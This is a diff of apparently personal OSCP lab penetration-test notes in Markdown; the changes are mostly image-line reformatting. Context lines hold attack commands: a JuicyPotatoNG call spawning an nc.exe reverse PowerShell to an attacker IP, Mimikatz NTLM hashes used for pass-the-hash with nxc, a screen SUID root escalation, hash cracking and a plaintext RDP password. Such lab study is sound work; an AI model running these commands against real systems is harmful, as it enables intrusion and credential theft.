@@ -1,4 +1,5 @@
 ## Overview
+
 ![image](_assets/HyDMw1FLbg.png)
 
 ## Nmap(外網)
@@ -326,9 +327,12 @@ Target: http://192.168.125.141:81/
          File Permissions "C:\wamp64\uninstall_services.bat": Authenticated Users [Allow: WriteData/CreateFiles]
          File Permissions "C:\wamp64\wampmanager.exe": Authenticated Users [Allow: WriteData/CreateFiles]
     ```
-    ![image](_assets/r1_UQTlwbl.png)
-    ![image](_assets/SyjmE6lw-e.png)
-    ![image](_assets/rJbv4pgPWe.png)
+
+       ![image](_assets/r1_UQTlwbl.png)
+
+       ![image](_assets/SyjmE6lw-e.png)
+
+       ![image](_assets/rJbv4pgPWe.png)
     
     2. SeImpersonatePrivilege
     `C:\wamp64\www\Script\JuicyPotatoNG.exe -t * -p "C:\wamp64\www\Script\nc.exe" -a "192.168.45.208 4444 -e powershell"`
@@ -357,9 +361,13 @@ Target: http://192.168.125.141:81/
 
 * Mimikatz
 `9a3121977ee93af56ebd0ef4f527a35e`
-![image](_assets/B1h1cTxDWe.png)
+
+  ![image](_assets/B1h1cTxDWe.png)
+
 `e728ecbadfb02f51ce8eed753f3ff3fd`
-![image](_assets/HJq1oaxwWe.png)
+
+  ![image](_assets/HJq1oaxwWe.png)
+
 ```
 ┌──(kali㉿kali)-[/usr/share/windows-resources/mimikatz]
 └─$ nxc winrm 10.10.90.0/24 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd         
@@ -382,6 +390,7 @@ Running nxc against 256 targets ━━━━━━━━━━━━━━━━
   ![image](_assets/BJLIZXC8Zx.png)
 
   ![image](_assets/BkeH-QCLZx.png)
+
     * CVE-2020-13151
     Failed for port 4444, guessing its been blocked, attempt to 80 port
     ```
@@ -425,12 +434,14 @@ Running nxc against 256 targets ━━━━━━━━━━━━━━━━
     ```
     
 * Privilege Escalation
-	1. `SUID`
-	https://github.com/YasserREED/screen-v4.5.0-priv-escalate
+    1. `SUID`
+    https://github.com/YasserREED/screen-v4.5.0-priv-escalate
 	```
 	-rwsr-xr-x 1 root root 1.8M May 10  2021 /usr/bin/screen-4.5.0 (Unknown SUID binary!)
 	```
-	![image](_assets/BJaOGNRIbe.png)
+
+       ![image](_assets/BJaOGNRIbe.png)
+
 	```
 	aero@oscp:/etc$ /tmp/rootshell
 	/tmp/rootshell
@@ -441,7 +452,7 @@ Running nxc against 256 targets ━━━━━━━━━━━━━━━━
 	uid=0(root) gid=0(root) groups=0(root)
 	# 
 	```
-	
+    
 ## 192.168.x.144
 * ftp anonymous login
 ```
@@ -592,7 +603,9 @@ drwxr-xr-x 3 root   root    4096 Nov 18  2022 ../
 -rw-r--r-- 1 stuart stuart 24701 Nov 18  2022 sitebackup2.zip
 -rw-r--r-- 1 stuart stuart 25312 Mar  5  2020 sitebackup3.zip
 ```
-![image](_assets/By5UtEzDWx.png)
+
+   ![image](_assets/By5UtEzDWx.png)
+
 ```
 ┌──(kali㉿kali)-[~/Desktop/Pen200/OSCP_A/192.168.x.144]
 └─$ zip2john sitebackup3.zip > passwd.hash 
@@ -732,12 +745,17 @@ chloe@oscp:/home/stuart$
 * unisql?
 
   ![image](_assets/H1L14SR8-x.png)
+
     1. Github
-    ![image](_assets/HypamSA8Zg.png)
+
+       ![image](_assets/HypamSA8Zg.png)
 
     2. ExploitDB
-    ![image](_assets/SkNmEB0UZe.png)
-    ![image](_assets/BJYywH0U-g.png)
+
+       ![image](_assets/SkNmEB0UZe.png)
+
+       ![image](_assets/BJYywH0U-g.png)
+
     ```
     ┌──(kali㉿kali)-[~/Desktop/Pen200/OSCP_A/192.168.x.145]
 	└─$ nc -lvnp 4444
@@ -769,7 +787,9 @@ chloe@oscp:/home/stuart$
     
 * Privilege Escalation
  1. `Putty`
-![image](_assets/HkTJ2Oyw-l.png)
+
+    ![image](_assets/HkTJ2Oyw-l.png)
+
     ```
     ┌──(kali㉿kali)-[~/Desktop/Pen200/OSCP_A/192.168.x.145]
     └─$ nxc rdp 192.168.125.145 -u zachary -p Th3R@tC@tch3r
